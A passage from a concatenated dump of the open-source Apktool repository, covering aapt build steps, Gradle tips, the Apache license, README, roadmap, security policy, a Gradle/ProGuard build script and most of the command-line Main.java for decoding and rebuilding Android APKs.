5. `strip out/host/linux-x86/bin/aapt_64`
6. `strip out/host/windows-x86/bin/aapt.exe`
7. `strip out/host/windows-x86/bin/aapt_64.exe`

#### Mac
1. `source build/envsetup.sh`
2. `m aapt`
3. `strip out/host/darwin-x86/bin/aapt_64`

32/64 bit binaries will be built for Linux and Windows.

### Building the aapt2 binary.

The steps below are different per flavor and operating system.

#### Linux / Windows
1. `m aapt2`
2. `strip out/host/linux-x86/bin/aapt2`
3. `strip out/host/linux-x86/bin/aapt2_64`
4. `strip out/host/windows-x86/bin/aapt2.exe`
5. `strip out/host/windows-x86/bin/aapt2_64.exe`

#### Mac
1. `export ANDROID_JAVA_HOME=/Path/To/Jdk`
2. `source build/envsetup.sh`
3. `m aapt2`
4. `strip out/host/darwin-x86/bin/aapt2_64`

#### Confirming aapt/aapt2 builds are static

There are some issues with some dependencies (namely `libc++`) in which they are built in the shared state. This is
alright in the scope and context of AOSP/Android Studio, but once you leave those two behind and start using aapt on
its own, you encounter some issues. The key is to force `libc++` to be built statically which takes some tweaks with the
AOSP build systems as that dependency isn't standard like `libz` and others.

You can test the finalized project using tools like `ldd` (unix) and `otool -L` (mac) for testing the binaries looking
for shared dependencies.

# Gradle Tips n Tricks

    ./gradlew build shadowJar proguard -x test

This skips the testing suite (which currently takes 2-4 minutes). Use this when making quick builds and save the testing
suite before pushing to GitHub.

    ./gradlew test --debug-jvm

This enables debugging on the test suite. This starts the debugger on port 5005 which you can connect with IntelliJ.

    ./gradlew :brut.apktool:apktool-lib:test ---tests "*BuildAndDecodeTest"

This runs the library project of Apktool, selecting a specific test to run. Comes in handy when writing a new test and
only wanting to run that one. The asterisk is used to the full path to the test can be ignored. You can additionally
match this with the debugging parameter to debug a specific test. This command can be found below.

    ./gradlew :brut.apktool:apktool-lib:test --tests "*BuildAndDecodeTest" --debug-jvm

```

`LICENSE.md`:

```md
                                 Apache License
                           Version 2.0, January 2004
                        https://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   Copyright 2010 Ryszard Wiśniewski

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       https://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

```

`README.md`:

```md
### Apktool
**This is the repository for Apktool. If you are looking for the Apktool website. Click [here](https://github.com/iBotPeaches/Apktool/tree/gh-pages).**

[![Join the chat at https://gitter.im/iBotPeaches/Apktool](https://badges.gitter.im/iBotPeaches/Apktool.svg)](https://gitter.im/iBotPeaches/Apktool?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![CI](https://github.com/iBotPeaches/Apktool/actions/workflows/build.yml/badge.svg)](https://github.com/iBotPeaches/Apktool/actions/workflows/test.yml)
[![Software License](https://img.shields.io/badge/license-Apache%202.0-brightgreen.svg)](https://github.com/iBotPeaches/Apktool/blob/master/LICENSE)

It is a tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications; it makes possible to debug smali code step by step. Also it makes working with app easier because of project-like files structure and automation of some repetitive tasks like building apk, etc.

It is NOT intended for piracy and other non-legal uses. It could be used for localizing, adding some features or support for custom platforms and other GOOD purposes. Just try to be fair with authors of an app, that you use and probably like.

#### Support
- [Project Page](https://ibotpeaches.github.io/Apktool/)
- [#apktool on libera.chat](https://web.libera.chat/)

#### Sponsored by

* [Sourcetoad](https://www.sourcetoad.com/cool-tools/apktool/) - helping with a weekly sponsorship for continued improvement and maintenance of the project.

#### IDE of Choice

* [JetBrains IntelliJ](https://www.jetbrains.com/idea/)

#### Security Vulnerabilities

If you discover a security vulnerability within Apktool, please send an e-mail to Connor Tumbleson at connor.tumbleson(at)gmail.com. All security vulnerabilities will be promptly addressed.

#### Links
- [Downloads](https://bitbucket.org/iBotPeaches/apktool/downloads)
- [Downloads Mirror](https://connortumbleson.com/apktool/)
- [How to Build](https://ibotpeaches.github.io/Apktool/build/)
- [Documentation](https://ibotpeaches.github.io/Apktool/documentation/)
- [Bug Reports](https://github.com/iBotPeaches/Apktool/issues)
- [Chat on Gitter](https://gitter.im/iBotPeaches/Apktool)
- [Changelog/Information](https://ibotpeaches.github.io/Apktool/changes/)
- [XDA Post](https://forum.xda-developers.com/t/util-dec-2-2020-apktool-tool-for-reverse-engineering-apk-files.1755243/)
- [Source (Github)](https://github.com/iBotPeaches/Apktool)
- [Source (Bitbucket)](https://bitbucket.org/iBotPeaches/apktool/)


```

`ROADMAP.md`:

```md
## Automatic Remapping of ResourceId
We currently prevent resourceIds from changing, by utilizing the `public.xml` file which makes the resources public, but
then prevents them to be used in some locations (`android:scheme`). The correct fix would be to record the resourceIds
and use dexlib2 (no regular expressions) to rewrite them to the new resourceId after the `resources.arsc` is built.

This would be a lookup table of old->new resourceIds leveraging the API of dexlib2 to do the replacement. Doing this
properly would nullify the need to do [#191](https://github.com/iBotPeaches/Apktool/issues/191)

Suggestions: [#244](https://github.com/iBotPeaches/Apktool/issues/244)
Discussions: [#2062](https://github.com/iBotPeaches/Apktool/issues/2062)

## Implicit Qualifiers Cleanup
Currently we have a mismatch between reading the folders and reading the qualifiers which leads to a mismatch between
implicit qualifiers like version (-v4, v13, etc).

This was first spotted in bug [#1272](https://github.com/iBotPeaches/Apktool/issues/1272).

This was attempted to be fixed in [!1758](https://github.com/iBotPeaches/Apktool/pull/1758/files), but had to be
reverted due to [this](https://github.com/iBotPeaches/Apktool/issues/1272#issuecomment-379345005).

Suggestions: [#2237](https://github.com/iBotPeaches/Apktool/issues/2237)

## Qualifier Plugin System
For some OEMs, past and present. They re-use qualifiers that AOSP ends up using. This with CTS is becoming very
rare and pretty much a problem of the past, but now custom modifications and more "off the cuff" OEMs are doing
it.

Apktool can't do anything because it stays true to AOSP. It would need a plugin system that controls how to
read the qualifiers. Or even an override file.

Suggestions: [#1420](https://github.com/iBotPeaches/Apktool/issues/1420), [#2474](https://github.com/iBotPeaches/Apktool/issues/2474)

## Non-reference Resources
Some applications may shove resources into the /res folder, but have no references to them. Apktool follows
the resource table, so these files are effectively abandoned.

Crawling the filesystem for non-checked files would be slow especially having to cross check with already
parsed files.

Suggestions: [#1366](https://github.com/iBotPeaches/Apktool/issues/1366)

## Multi-threaded
Applications are getting larger as well as frameworks, but Apktool is getting slower.

Suggestions: [#2685](https://github.com/iBotPeaches/Apktool/issues/2685)

## Android Support
Folks have requested running Apktool on device itself. This has been a challenge due to the arch requirements
that would be placed on the aapt2/aapt binaries.

Suggestions: [#2811](https://github.com/iBotPeaches/Apktool/issues/2811)

```

`SECURITY.md`:

```md
# Security Policy

## Reporting a Vulnerability

If you discover a security vulnerability within Apktool, please send an e-mail to Connor Tumbleson at connor.tumbleson(at)gmail.com. 
All security vulnerabilities will be promptly addressed.

```

`brut.apktool/apktool-cli/build.gradle`:

```gradle
/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
import proguard.gradle.ProGuardTask

apply plugin: 'com.github.johnrengelman.shadow'

dependencies {
    implementation depends.commons_cli
    implementation project(':brut.apktool:apktool-lib')
}

buildscript {
    repositories {
        mavenCentral()
    }

    dependencies {
        classpath(depends.proguard_gradle) {
            exclude group: 'com.android.tools.build'
        }
    }
}

jar {
    manifest {
        attributes 'Main-Class': 'brut.apktool.Main'
    }
}

task cleanOutputDirectory(type: Delete) {
    delete fileTree(dir: jar.getDestinationDirectory().getAsFile(), exclude: "apktool-cli-all.jar")
}

task proguard(type: ProGuardTask, dependsOn: shadowJar) {
    injars shadowJar.getArchiveFile()

    // Java 9 and prior uses merged package for runtime, later uses split jmod files.
    if (JavaVersion.current() <= JavaVersion.VERSION_1_8) {
        libraryjars "${System.properties['java.home']}/lib/jce.jar"
        libraryjars "${System.properties['java.home']}/lib/rt.jar"
    } else {
        libraryjars "${System.properties['java.home']}/jmods/java.base.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.compiler.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.logging.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.xml.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.desktop.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.sql.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
        libraryjars "${System.properties['java.home']}/jmods/java.scripting.jmod", jarfilter: '!**.jar', filter: '!module-info.class'

        libraryjars "${System.properties['java.home']}/jmods/jdk.unsupported.jmod", jarfilter: '!**.jar', filter: '!module-info.class'
    }

    dontobfuscate
    dontoptimize

    keep 'public class brut.apktool.Main { public static void main(java.lang.String[]); }'
    keepclassmembers 'enum * { public static **[] values(); public static ** valueOf(java.lang.String); }'
    dontwarn 'com.google.common.base.**'
    dontwarn 'com.google.common.collect.**'
    dontwarn 'com.google.common.util.**'
    dontwarn 'javax.xml.xpath.**'
    dontnote '**'
    // between Java 1.8 and 1.9, the signature of `flip()` changed, which trips up proguard.
    dontwarn 'org.yaml.snakeyaml.scanner.ScannerImpl'

    def outPath = jar.getDestinationDirectory().getAsFile().get().toString()
    def extension = jar.archiveExtension.get().toString()
    def outFile = outPath + '/' + "apktool" + '-' + project.apktool_version + '-small' + '.' + extension
    outjars outFile
}

proguard.dependsOn cleanOutputDirectory
tasks.getByPath(':release').dependsOn(proguard)

```

`brut.apktool/apktool-cli/src/main/java/brut/apktool/Main.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.apktool;

import brut.androlib.*;
import brut.androlib.err.CantFindFrameworkResException;
import brut.androlib.err.InFileNotFoundException;
import brut.androlib.err.OutDirExistsException;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.DirectoryException;
import brut.util.AaptManager;
import brut.util.OSDetection;
import org.apache.commons.cli.*;

import java.io.File;
import java.io.IOException;
import java.util.logging.*;

public class Main {
    public static void main(String[] args) throws BrutException {

        // headless
        System.setProperty("java.awt.headless", "true");

        // set verbosity default
        Verbosity verbosity = Verbosity.NORMAL;

        // cli parser
        CommandLineParser parser = new DefaultParser();
        CommandLine commandLine;

        // load options
        _Options();

        try {
            commandLine = parser.parse(allOptions, args, false);

            if (! OSDetection.is64Bit()) {
                System.err.println("32 bit support is deprecated. Apktool will not support 32bit on v3.0.0.");
            }
        } catch (ParseException ex) {
            System.err.println(ex.getMessage());
            usage();
            System.exit(1);
            return;
        }

        // check for verbose / quiet
        if (commandLine.hasOption("-v") || commandLine.hasOption("--verbose")) {
            verbosity = Verbosity.VERBOSE;
        } else if (commandLine.hasOption("-q") || commandLine.hasOption("--quiet")) {
            verbosity = Verbosity.QUIET;
        }
        setupLogging(verbosity);

        // check for advance mode
        if (commandLine.hasOption("advance") || commandLine.hasOption("advanced")) {
            setAdvanceMode();
        }

        boolean cmdFound = false;
        for (String opt : commandLine.getArgs()) {
            if (opt.equalsIgnoreCase("d") || opt.equalsIgnoreCase("decode")) {
                cmdDecode(commandLine);
                cmdFound = true;
            } else if (opt.equalsIgnoreCase("b") || opt.equalsIgnoreCase("build")) {
                cmdBuild(commandLine);
                cmdFound = true;
            } else if (opt.equalsIgnoreCase("if") || opt.equalsIgnoreCase("install-framework")) {
                cmdInstallFramework(commandLine);
                cmdFound = true;
            } else if (opt.equalsIgnoreCase("empty-framework-dir")) {
                cmdEmptyFrameworkDirectory(commandLine);
                cmdFound = true;
            } else if (opt.equalsIgnoreCase("list-frameworks")) {
                cmdListFrameworks(commandLine);
                cmdFound = true;
            } else if (opt.equalsIgnoreCase("publicize-resources")) {
                cmdPublicizeResources(commandLine);
                cmdFound = true;
            }
        }

        // if no commands ran, run the version / usage check.
        if (!cmdFound) {
            if (commandLine.hasOption("version")) {
                _version();
                System.exit(0);
            } else {
                usage();
            }
        }
    }

    private static void cmdDecode(CommandLine cli) throws AndrolibException {
        ApkDecoder decoder = new ApkDecoder();

        int paraCount = cli.getArgList().size();
        String apkName = cli.getArgList().get(paraCount - 1);
        File outDir;

        // check for options
        if (cli.hasOption("s") || cli.hasOption("no-src")) {
            decoder.setDecodeSources(ApkDecoder.DECODE_SOURCES_NONE);
        }
        if (cli.hasOption("only-main-classes")) {
            decoder.setDecodeSources(ApkDecoder.DECODE_SOURCES_SMALI_ONLY_MAIN_CLASSES);
        }
        if (cli.hasOption("d") || cli.hasOption("debug")) {
            System.err.println("SmaliDebugging has been removed in 2.1.0 onward. Please see: https://github.com/iBotPeaches/Apktool/issues/1061");
            System.exit(1);
        }
        if (cli.hasOption("b") || cli.hasOption("no-debug-info")) {
            decoder.setBaksmaliDebugMode(false);
        }
        if (cli.hasOption("t") || cli.hasOption("frame-tag")) {
            decoder.setFrameworkTag(cli.getOptionValue("t"));
        }
        if (cli.hasOption("f") || cli.hasOption("force")) {
            decoder.setForceDelete(true);
        }
        if (cli.hasOption("r") || cli.hasOption("no-res")) {
            decoder.setDecodeResources(ApkDecoder.DECODE_RESOURCES_NONE);
        }
        if (cli.hasOption("force-manifest")) {
            decoder.setForceDecodeManifest(ApkDecoder.FORCE_DECODE_MANIFEST_FULL);
        }
        if (cli.hasOption("no-assets")) {
            decoder.setDecodeAssets(ApkDecoder.DECODE_ASSETS_NONE);
        }
        if (cli.hasOption("k") || cli.hasOption("keep-broken-res")) {
            decoder.setKeepBrokenResources(true);
        }
        if (cli.hasOption("p") || cli.hasOption("frame-path")) {
            decoder.setFrameworkDir(cli.getOptionValue("p"));
        }
        if (cli.hasOption("m") || cli.hasOption("match-original")) {
            decoder.setAnalysisMode(true);
        }
        if (cli.hasOption("api") || cli.hasOption("api-level")) {
            decoder.setApiLevel(Integer.parseInt(cli.getOptionValue("api")));
        }
        if (cli.hasOption("o") || cli.hasOption("output")) {
            outDir = new File(cli.getOptionValue("o"));
        } else {
            // make out folder manually using name of apk
            String outName = apkName;
            outName = outName.endsWith(".apk") ? outName.substring(0,
                    outName.length() - 4).trim() : outName + ".out";

            // make file from path
            outName = new File(outName).getName();
            outDir = new File(outName);
        }

        decoder.setOutDir(outDir);
        decoder.setApkFile(new File(apkName));

        try {
            decoder.decode();
        } catch (OutDirExistsException ex) {
            System.err
                    .println("Destination directory ("
                            + outDir.getAbsolutePath()
                            + ") "
                            + "already exists. Use -f switch if you want to overwrite it.");
            System.exit(1);
        } catch (InFileNotFoundException ex) {
            System.err.println("Input file (" + apkName + ") " + "was not found or was not readable.");
            System.exit(1);
        } catch (CantFindFrameworkResException ex) {
            System.err
                    .println("Can't find framework resources for package of id: "
                            + ex.getPkgId()
                            + ". You must install proper "
                            + "framework files, see project website for more info.");
            System.exit(1);
        } catch (IOException ex) {
            System.err.println("Could not modify file. Please ensure you have permission.");
            System.exit(1);
        } catch (DirectoryException ex) {
            System.err.println("Could not modify internal dex files. Please ensure you have permission.");
            System.exit(1);
        } finally {
            try {
                decoder.close();
            } catch (IOException ignored) {}
        }
    }

    private static void cmdBuild(CommandLine cli) {
        String[] args = cli.getArgs();
        String appDirName = args.length < 2 ? "." : args[1];
        File outFile;
        BuildOptions buildOptions = new BuildOptions();

        // check for build options
        if (cli.hasOption("f") || cli.hasOption("force-all")) {
            buildOptions.forceBuildAll = true;
        }
        if (cli.hasOption("d") || cli.hasOption("debug")) {
            buildOptions.debugMode = true;
        }
        if (cli.hasOption("n") || cli.hasOption("net-sec-conf")) {
            buildOptions.netSecConf = true;
        }
        if (cli.hasOption("v") || cli.hasOption("verbose")) {
            buildOptions.verbose = true;
        }
        if (cli.hasOption("a") || cli.hasOption("aapt")) {
            buildOptions.aaptPath = cli.getOptionValue("a");
        }
        if (cli.hasOption("c") || cli.hasOption("copy-original")) {
            System.err.println("-c/--copy-original has been deprecated. Removal planned for v3.0.0 (#2129)");
            buildOptions.copyOriginalFiles = true;
        }
        if (cli.hasOption("p") || cli.hasOption("frame-path")) {
            buildOptions.frameworkFolderLocation = cli.getOptionValue("p");
        }
        if (cli.hasOption("nc") || cli.hasOption("no-crunch")) {
            buildOptions.noCrunch = true;
        }

        // Temporary flag to enable the use of aapt2. This will transform in time to a use-aapt1 flag, which will be
        // legacy and eventually removed.
        if (cli.hasOption("use-aapt2")) {
            buildOptions.useAapt2 = true;
        }
        if (cli.hasOption("api") || cli.hasOption("api-level")) {
            buildOptions.forceApi = Integer.parseInt(cli.getOptionValue("api"));
        }
        if (cli.hasOption("o") || cli.hasOption("output")) {
            outFile = new File(cli.getOptionValue("o"));
        } else {
            outFile = null;
        }

        if (buildOptions.netSecConf && !buildOptions.useAapt2) {
            System.err.println("-n / --net-sec-conf is only supported with --use-aapt2.");
            System.exit(1);
        }

        // try and build apk
        try {
            if (cli.hasOption("a") || cli.hasOption("aapt")) {
                buildOptions.aaptVersion = AaptManager.getAaptVersion(cli.getOptionValue("a"));
            }
            new Androlib(buildOptions).build(new File(appDirName), outFile);
        } catch (BrutException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    private static void cmdInstallFramework(CommandLine cli) throws AndrolibException {
        int paraCount = cli.getArgList().size();
        String apkName = cli.getArgList().get(paraCount - 1);

        brut.androlib.options.BuildOptions buildOptions = new BuildOptions();
        if (cli.hasOption("p") || cli.hasOption("frame-path")) {
            buildOptions.frameworkFolderLocation = cli.getOptionValue("p");
        }
        if (cli.hasOption("t") || cli.hasOption("tag")) {
            buildOptions.frameworkTag = cli.getOptionValue("t");
        }
        new Androlib(buildOptions).installFramework(new File(apkName));
    }

    private static void cmdListFrameworks(CommandLine cli) throws AndrolibException {
        brut.androlib.options.BuildOptions buildOptions = new BuildOptions();
        if (cli.hasOption("p") || cli.hasOption("frame-path")) {
            buildOptions.frameworkFolderLocation = cli.getOptionValue("p");
        }

        new Androlib(buildOptions).listFrameworks();
    }

    private static void cmdPublicizeResources(CommandLine cli) throws AndrolibException {
        int paraCount = cli.getArgList().size();
        String apkName = cli.getArgList().get(paraCount - 1);

        new Androlib().publicizeResources(new File(apkName));
    }

    private static void cmdEmptyFrameworkDirectory(CommandLine cli) throws AndrolibException {
        brut.androlib.options.BuildOptions buildOptions = new BuildOptions();

        if (cli.hasOption("f") || cli.hasOption("force")) {
            buildOptions.forceDeleteFramework = true;
        }
        if (cli.hasOption("p") || cli.hasOption("frame-path")) {
            buildOptions.frameworkFolderLocation = cli.getOptionValue("p");
        }

        new Androlib(buildOptions).emptyFrameworkDirectory();
    }

    private static void _version() {
        System.out.println(Androlib.getVersion());
    }

    private static void _Options() {

        // create options
        Option versionOption = Option.builder("version")
                .longOpt("version")
                .desc("prints the version then exits")
                .build();

        Option advanceOption = Option.builder("advance")
                .longOpt("advanced")
                .desc("prints advance information.")
                .build();

        Option noSrcOption = Option.builder("s")
                .longOpt("no-src")
                .desc("Do not decode sources.")
                .build();

        Option onlyMainClassesOption = Option.builder()
                .longOpt("only-main-classes")
                .desc("Only disassemble the main dex classes (classes[0-9]*.dex) in the root.")
                .build();

        Option noResOption = Option.builder("r")
                .longOpt("no-res")
                .desc("Do not decode resources.")
                .build();

        Option forceManOption = Option.builder()
                .longOpt("force-manifest")
                .desc("Decode the APK's compiled manifest, even if decoding of resources is set to \"false\".")
                .build();

        Option noAssetOption = Option.builder()
                .longOpt("no-assets")
                .desc("Do not decode assets.")
                .build();

        Option debugDecOption = Option.builder("d")
                .longOpt("debug")
                .desc("REMOVED (DOES NOT WORK): Decode in debug mode.")
                .build();

        Option analysisOption = Option.builder("m")
                .longOpt("match-original")
                .desc("Keeps files to closest to original as possible. Prevents rebuild.")
                .build();

        Option apiLevelOption = Option.builder("api")
                .longOpt("api-level")
                .desc("The numeric api-level of the file to generate, e.g. 14 for ICS.")
                .hasArg(true)
                .argName("API")
                .build();

        Option debugBuiOption = Option.builder("d")
                .longOpt("debug")
                .desc("Sets android:debuggable to \"true\" in the APK's compiled manifest")
                .build();

        Option netSecConfOption = Option.builder("n")
            .longOpt("net-sec-conf")
            .desc("Adds a generic Network Security Configuration file in the output APK")
            .build();

        Option noDbgOption = Option.builder("b")
                .longOpt("no-debug-info")
                .desc("don't write out debug info (.local, .param, .line, etc.)")
                .build();

        Option forceDecOption = Option.builder("f")
                .longOpt("force")
                .desc("Force delete destination directory.")
                .build();

        Option frameTagOption = Option.builder("t")
                .longOpt("frame-tag")
                .desc("Uses framework files tagged by <tag>.")
                .hasArg(true)
                .argName("tag")
                .build();

        Option frameDirOption = Option.builder("p")
                .longOpt("frame-path")
                .desc("Uses framework files located in <dir>.")
                .hasArg(true)
                .argName("dir")
                .build();

        Option frameIfDirOption = Option.builder("p")
                .longOpt("frame-path")
                .desc("Stores framework files into <dir>.")
                .hasArg(true)
                .argName("dir")
                .build();

        Option keepResOption = Option.builder("k")
                .longOpt("keep-broken-res")
                .desc("Use if there was an error and some resources were dropped, e.g.\n"
                        + "            \"Invalid config flags detected. Dropping resources\", but you\n"
                        + "            want to decode them anyway, even with errors. You will have to\n"
                        + "            fix them manually before building.")
                .build();

        Option forceBuiOption = Option.builder("f")
                .longOpt("force-all")
                .desc("Skip changes detection and build all files.")
                .build();

        Option aaptOption = Option.builder("a")
                .longOpt("aapt")
                .hasArg(true)
                .argName("loc")
                .desc("Loads aapt from specified location.")
                .build();

        Option aapt2Option = Option.builder()
                .longOpt("use-aapt2")
                .desc("Upgrades apktool to use experimental aapt2 binary.")
                .build();

        Option originalOption = Option.builder("c")
                .longOpt("copy-original")
                .desc("Copies original AndroidManifest.xml and META-INF. See project page for more info.")
                .build();

        Option noCrunchOption = Option.builder("nc")
                .longOpt("no-crunch")
                .desc("Disable crunching of resource files during the build step.")
                .build();

        Option tagOption = Option.builder("t")
                .longOpt("tag")
                .desc("Tag frameworks using <tag>.")
                .hasArg(true)
                .argName("tag")
                .build();

        Option outputBuiOption = Option.builder("o")
                .longOpt("output")
                .desc("The name of apk that gets written. Default is dist/name.apk")
                .hasArg(true)
                .argName("dir")
                .build();

        Option outputDecOption = Option.builder("o")
                .longOpt("output")
                .desc("The name of folder that gets written. Default is apk.out")
                .hasArg(true)
                .argName("dir")
                .build();

        Option quietOption = Option.builder("q")
                .longOpt("quiet")
                .build();

        Option verboseOption = Option.builder("v")
                .longOpt("verbose")
                .build();

        // check for advance mode
        if (isAdvanceMode()) {
            decodeOptions.addOption(noDbgOption);
            decodeOptions.addOption(keepResOption);
            decodeOptions.addOption(analysisOption);
            decodeOptions.addOption(onlyMainClassesOption);
